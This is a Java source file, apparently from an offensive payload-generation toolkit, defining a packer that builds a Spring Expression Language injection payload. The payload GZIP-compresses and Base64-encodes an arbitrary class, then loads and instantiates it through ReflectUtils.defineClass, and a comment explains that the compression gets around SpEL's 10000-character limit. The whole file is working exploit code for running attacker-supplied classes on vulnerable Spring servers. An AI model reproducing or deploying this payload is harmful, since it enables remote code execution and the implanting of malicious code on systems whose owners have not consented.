package com.reajason.javaweb.packer.spel;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Packers;


/**
 *
 * @since 5.2.24，SpEL 限制了长度为 10000，常规的 Base64 编码已经不适用，需要进一步使用 GZIP 压缩
 * https://github.com/spring-projects/spring-framework/blob/2ed1b6e6dda48ff0c74b67b39cba65676b5397b6/spring-expression/src/main/java/org/springframework/expression/spel/standard/InternalSpelExpressionParser.java#L100
 *
 * @author ReaJason
 * @since 2024/12/13
 */
public class SpELSpringGzipPacker implements Packer {
    String template = "T(org.springframework.cglib.core.ReflectUtils).defineClass('{{className}}',T(org.springframework.util.StreamUtils).copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(org.springframework.util.Base64Utils).decodeFromString('{{base64Str}}')))),new java.net.URLClassLoader(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()";

    @Override
    public String pack(ClassPackerConfig config) {
        return template.replace("{{className}}", config.getClassName())
                .replace("{{base64Str}}", Packers.GzipBase64.getInstance().pack(config));
    }
}